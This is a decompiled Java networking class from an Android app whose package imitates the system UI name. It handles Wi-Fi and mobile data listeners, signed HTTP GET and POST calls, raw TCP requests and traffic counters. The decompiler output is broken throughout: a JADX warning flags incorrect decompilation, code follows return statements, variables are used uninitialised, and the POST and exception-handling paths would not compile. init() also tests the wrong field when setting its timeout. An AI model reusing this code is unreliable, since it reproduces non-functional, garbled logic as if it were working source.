package com.android.systemui.assis.modules;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.NetworkInfo;
import android.net.NetworkInfo.State;
import android.net.TrafficStats;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import com.android.systemui.assis.app.LOG;
import com.android.systemui.assis.app.MAIN.KEY;
import com.android.systemui.assis.app.MAIN.NET;
import com.android.systemui.assis.datas.security.Guardian;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetAddress;
import java.net.Socket;
import java.net.UnknownHostException;
import java.util.Random;
import org.apache.http.HttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.ByteArrayEntity;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.impl.client.DefaultHttpRequestRetryHandler;
import org.apache.http.util.EntityUtils;

public class NetworkManager {
    private static final int PREDEFINED_TCP_HEADER_SIZE = 4;
    private static final String TAG = "NetworkManager";
    private Context mContext = null;
    private boolean mEnablePost = false;
    private int mHttpRetryCount = 0;
    private int mHttpTimeOut = 0;
    private boolean mIsInited = false;
    private boolean mIsWifiConneted = false;
    private INetworkStatusListener mListener = null;
    private PhoneStateListener mPhoneStateListener = null;
    private BroadcastReceiver mReceiver = new BroadcastReceiver() {
        public void onReceive(Context context, Intent intent) {
            if (intent.getAction().equals("android.net.wifi.STATE_CHANGE")) {
                NetworkInfo info = (NetworkInfo) intent.getParcelableExtra("networkInfo");
                boolean isDisconnected = info.getState().equals(State.DISCONNECTED);
                if (info.isConnected()) {
                    if (!(NetworkManager.this.mIsWifiConneted || NetworkManager.this.mListener == null)) {
                        NetworkManager.this.mListener.onStatusChange(NET_STAT.NET_WIFI_CONN);
                    }
                    NetworkManager.this.mIsWifiConneted = true;
                } else if (isDisconnected) {
                    if (NetworkManager.this.mIsWifiConneted && NetworkManager.this.mListener != null) {
                        NetworkManager.this.mListener.onStatusChange(NET_STAT.NET_WIFI_LOST);
                    }
                    NetworkManager.this.mIsWifiConneted = false;
                }
            }
        }
    };
    private TelephonyManager mTelephonyManager = null;

    public interface INetworkStatusListener {
        void onStatusChange(NET_STAT net_stat);
    }

    public enum NET_STAT {
        NET_GPRS_LOST,
        NET_GPRS_CONN,
        NET_WIFI_LOST,
        NET_WIFI_CONN
    }

    public NetworkManager(Context context) {
        this.mContext = context;
        this.mTelephonyManager = (TelephonyManager) this.mContext.getSystemService("phone");
    }

    /* JADX WARNING: inconsistent code. */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public synchronized void init(int httpRetryCount, long httpDefaultTimeout, boolean enablePost) {
        if (!this.mIsInited) {
            if (this.mTelephonyManager != null) {
                this.mEnablePost = enablePost;
                if (httpRetryCount != 0) {
                    this.mHttpRetryCount = httpRetryCount;
                } else {
                    this.mHttpRetryCount = 3;
                }
                if (this.mHttpTimeOut != 0) {
                    this.mHttpTimeOut = (int) httpDefaultTimeout;
                } else {
                    this.mHttpTimeOut = NET.DEFAULT_TIMEOUT;
                }
                IntentFilter wifiInF = new IntentFilter();
                wifiInF.addAction("android.net.wifi.STATE_CHANGE");
                this.mContext.registerReceiver(this.mReceiver, wifiInF);
                this.mPhoneStateListener = new PhoneStateListener() {
                    public void onDataConnectionStateChanged(int state) {
                        super.onDataConnectionStateChanged(state);
                        switch (state) {
                            case 0:
                                if (NetworkManager.this.mListener != null) {
                                    NetworkManager.this.mListener.onStatusChange(NET_STAT.NET_GPRS_LOST);
                                    return;
                                }
                                return;
                            case 2:
                                if (NetworkManager.this.mListener != null) {
                                    NetworkManager.this.mListener.onStatusChange(NET_STAT.NET_GPRS_CONN);
                                    return;
                                }
                                return;
                            default:
                                return;
                        }
                    }
                };
                this.mTelephonyManager.listen(this.mPhoneStateListener, 64);
                this.mIsInited = true;
            }
        }
    }

    public void deInit() {
        if (this.mIsInited) {
            this.mContext.unregisterReceiver(this.mReceiver);
            LOG.I(TAG, "unregister listener to LISTEN_DATA_CONNECTION_STATE of TelephonyManager");
            this.mTelephonyManager.listen(this.mPhoneStateListener, 0);
            this.mPhoneStateListener = null;
        }
    }

    public void setListener(INetworkStatusListener listener) {
        this.mListener = listener;
    }

    public String doHttpPost(String url, String data) {
        DefaultHttpClient httpClient;
        HttpPost httpRequest;
        Exception e;
        Throwable th;
        if (!this.mEnablePost) {
            return null;
        }
        String ts;
        byte[] bufferBytes;
        int retryCount = 0;
        HttpPost httpRequest2 = null;
        DefaultHttpClient httpClient2 = null;
        while (true) {
            try {
                ts = String.valueOf(new Random().nextInt(9));
                String buffer = new StringBuilder(String.valueOf(data)).append("&sign=").append(Guardian.md5Encode(new StringBuilder(String.valueOf(ts)).append(KEY.GUARDIAN).toString())).toString();
                bufferBytes = buffer.getBytes();
                LOG.I(TAG, "HTTP POST HEAD[ts]:" + ts);
                LOG.I(TAG, "HTTP POST CONTENT:" + buffer);
                httpClient = new DefaultHttpClient();
                try {
                    httpClient.setHttpRequestRetryHandler(new DefaultHttpRequestRetryHandler(this.mHttpRetryCount, true));
                    httpClient.getParams().setParameter("http.socket.timeout", Integer.valueOf(this.mHttpTimeOut));
                    httpRequest = new HttpPost(url);
                    try {
                        break;
                    } catch (Exception e2) {
                        e = e2;
                    }
                } catch (Exception e3) {
                    e = e3;
                    httpRequest = httpRequest2;
                    e.printStackTrace();
                    retryCount++;
                    if (retryCount >= this.mHttpRetryCount) {
                        try {
                            Thread.sleep(1000);
                        } catch (InterruptedException e1) {
                            e1.printStackTrace();
                        } catch (Throwable th2) {
                            th = th2;
                        }
                        if (httpClient != null) {
                            httpClient.getConnectionManager().shutdown();
                        }
                    } else if (httpClient != null) {
                        httpClient.getConnectionManager().shutdown();
                    }
                    if (retryCount < this.mHttpRetryCount) {
                        return null;
                    }
                    httpRequest2 = httpRequest;
                    httpClient2 = httpClient;
                } catch (Throwable th3) {
                    th = th3;
                    httpRequest = httpRequest2;
                }
            } catch (Exception e4) {
                e = e4;
                httpRequest = httpRequest2;
                httpClient = httpClient2;
                e.printStackTrace();
                retryCount++;
                if (retryCount >= this.mHttpRetryCount) {
                    Thread.sleep(1000);
                    if (httpClient != null) {
                        httpClient.getConnectionManager().shutdown();
                    }
                } else if (httpClient != null) {
                    httpClient.getConnectionManager().shutdown();
                }
                if (retryCount < this.mHttpRetryCount) {
                    return null;
                }
                httpRequest2 = httpRequest;
                httpClient2 = httpClient;
            } catch (Throwable th4) {
                th = th4;
                httpRequest = httpRequest2;
                httpClient = httpClient2;
            }
            httpRequest2 = httpRequest;
            httpClient2 = httpClient;
        }
        httpRequest.setEntity(new ByteArrayEntity(bufferBytes));
        httpRequest.getParams().setParameter("http.socket.timeout", Integer.valueOf(this.mHttpTimeOut));
        httpRequest.addHeader("Charset", "UTF-8");
        httpRequest.addHeader("ts", ts);
        HttpResponse httpResponse = httpClient.execute(httpRequest);
        if (httpResponse.getStatusLine().getStatusCode() != 200) {
            if (httpClient != null) {
                httpClient.getConnectionManager().shutdown();
            }
            return null;
        }
        String result = EntityUtils.toString(httpResponse.getEntity());
        LOG.I(TAG, "result:= " + result);
        if (httpClient != null) {
            httpClient.getConnectionManager().shutdown();
        }
        return result;
        if (httpClient != null) {
            httpClient.getConnectionManager().shutdown();
        }
        throw th;
    }

    public String doHttpGet(String uri) {
        int retryCount = 0;
        do {
            String ts = String.valueOf(new Random().nextInt(9));
            try {
                HttpGet net = new HttpGet(new StringBuilder(String.valueOf(uri)).append("&sign=").append(Guardian.md5Encode(new StringBuilder(String.valueOf(ts)).append(KEY.GUARDIAN).toString())).toString());
                net.setHeader("ts", ts);
                HttpResponse httpRsp = new DefaultHttpClient().execute(net);
                if (httpRsp.getStatusLine().getStatusCode() == 200) {
                    return EntityUtils.toString(httpRsp.getEntity());
                }
            } catch (Exception e) {
                if (retryCount < this.mHttpRetryCount) {
                    e.printStackTrace();
                    retryCount++;
                    try {
                        Thread.sleep(1000);
                    } catch (InterruptedException e1) {
                        e1.printStackTrace();
                    }
                }
            }
        } while (retryCount < this.mHttpRetryCount);
        return null;
    }

    public static byte[] int2byteArray(int num) {
        return new byte[]{(byte) ((byte) (num >>> 24)), (byte) ((byte) (num >>> 16)), (byte) ((byte) (num >>> 8)), (byte) ((byte) num)};
    }

    public static int byteArray2int(byte[] b) {
        byte[] a = new byte[4];
        int i = a.length - 1;
        int j = b.length - 1;
        while (i >= 0) {
            if (j < 0) {
                a[i] = (byte) 0;
            } else {
                a[i] = (byte) b[j];
            }
            i--;
            j--;
        }
        return ((((a[0] & 255) << 24) + ((a[1] & 255) << 16)) + ((a[2] & 255) << 8)) + (a[3] & 255);
    }

    public String doTcpRequest(String svrIp, int svrPort, String requestData) {
        IOException e;
        UnknownHostException e2;
        Exception e3;
        Throwable th;
        Socket socket = null;
        String response = null;
        OutputStream outputStream = null;
        InputStream inputStream = null;
        try {
            Socket socket2 = new Socket(InetAddress.getByName(svrIp), svrPort);
            try {
                socket2.setSoTimeout(NET.DEFAULT_TIMEOUT);
                outputStream = socket2.getOutputStream();
                byte[] sendBuf = requestData.getBytes();
                outputStream.write(int2byteArray(sendBuf.length));
                outputStream.write(sendBuf);
                outputStream.flush();
                inputStream = socket2.getInputStream();
                byte[] buf = new byte[4];
                if (inputStream.read(buf) == 4) {
                    int contentLen = byteArray2int(buf);
                    buf = new byte[contentLen];
                    int c = inputStream.read(buf);
                    int loadedByteSize = c;
                    while (c > 0) {
                        if (loadedByteSize < contentLen) {
                            if (!socket2.isConnected()) {
                                break;
                            }
                            LOG.I(TAG, "len = " + contentLen + " new tmpBuf size :" + (contentLen - loadedByteSize));
                            Object tmpBuf = new byte[(contentLen - loadedByteSize)];
                            c = inputStream.read(tmpBuf);
                            if (c <= 0) {
                                LOG.E(TAG, "c = " + c);
                            } else {
                                System.arraycopy(tmpBuf, 0, buf, loadedByteSize, c);
                                loadedByteSize += c;
                                LOG.I(TAG, "c = " + c + " loadedByteSize = " + loadedByteSize);
                            }
                        } else {
                            break;
                        }
                    }
                    if (loadedByteSize != contentLen) {
                        response = null;
                    } else {
                        response = new String(buf);
                    }
                }
                if (outputStream != null) {
                    try {
                        outputStream.close();
                    } catch (IOException e4) {
                        e4.printStackTrace();
                    } catch (Exception e5) {
                    }
                }
                if (inputStream != null) {
                    inputStream.close();
                }
                if (socket2 != null) {
                    socket2.close();
                }
                return response;
            } catch (UnknownHostException e6) {
                e2 = e6;
                socket = socket2;
            } catch (IOException e7) {
                e4 = e7;
                socket = socket2;
            } catch (Exception e8) {
                e3 = e8;
                socket = socket2;
            } catch (Throwable th2) {
                th = th2;
                socket = socket2;
            }
        } catch (UnknownHostException e9) {
            e2 = e9;
            try {
                LOG.E(TAG, "UNKNOWN HOST!");
                e2.printStackTrace();
                if (outputStream != null) {
                    try {
                        outputStream.close();
                    } catch (IOException e42) {
                        e42.printStackTrace();
                        return null;
                    } catch (Exception e10) {
                        return null;
                    }
                }
                if (inputStream != null) {
                    inputStream.close();
                }
                if (socket != null) {
                    socket.close();
                }
                return null;
            } catch (Throwable th3) {
                th = th3;
                if (outputStream != null) {
                    try {
                        outputStream.close();
                    } catch (IOException e422) {
                        e422.printStackTrace();
                        throw th;
                    } catch (Exception e11) {
                        throw th;
                    }
                }
                if (inputStream != null) {
                    inputStream.close();
                }
                if (socket != null) {
                    socket.close();
                }
                throw th;
            }
        } catch (IOException e12) {
            e422 = e12;
            LOG.E(TAG, "SOCKET CREATE FAILED!");
            e422.printStackTrace();
            if (outputStream != null) {
                outputStream.close();
            }
            if (inputStream != null) {
                inputStream.close();
            }
            if (socket != null) {
                try {
                    socket.close();
                } catch (IOException e4222) {
                    e4222.printStackTrace();
                } catch (Exception e13) {
                }
            }
            return null;
        } catch (Exception e14) {
            e3 = e14;
            e3.printStackTrace();
            if (outputStream != null) {
                outputStream.close();
            }
            if (inputStream != null) {
                inputStream.close();
            }
            if (socket != null) {
                try {
                    socket.close();
                } catch (IOException e42222) {
                    e42222.printStackTrace();
                } catch (Exception e15) {
                }
            }
            return null;
        }
    }

    public long getUsedGprsTraffic() {
        int uid = this.mContext.getApplicationInfo().uid;
        LOG.I(TAG, "UID=" + uid);
        if (TrafficStats.getTotalRxBytes() == -1) {
            LOG.E(TAG, "TrafficStats is not supported on this device");
            return -1;
        }
        long totalReceived = TrafficStats.getUidRxBytes(uid);
        long totalSent = TrafficStats.getUidTxBytes(uid);
        long totalUsed = totalReceived + totalSent;
        LOG.I(TAG, "RECV:" + totalReceived + " SENT:" + totalSent + " TOTAL:" + totalUsed);
        return totalUsed;
    }
}
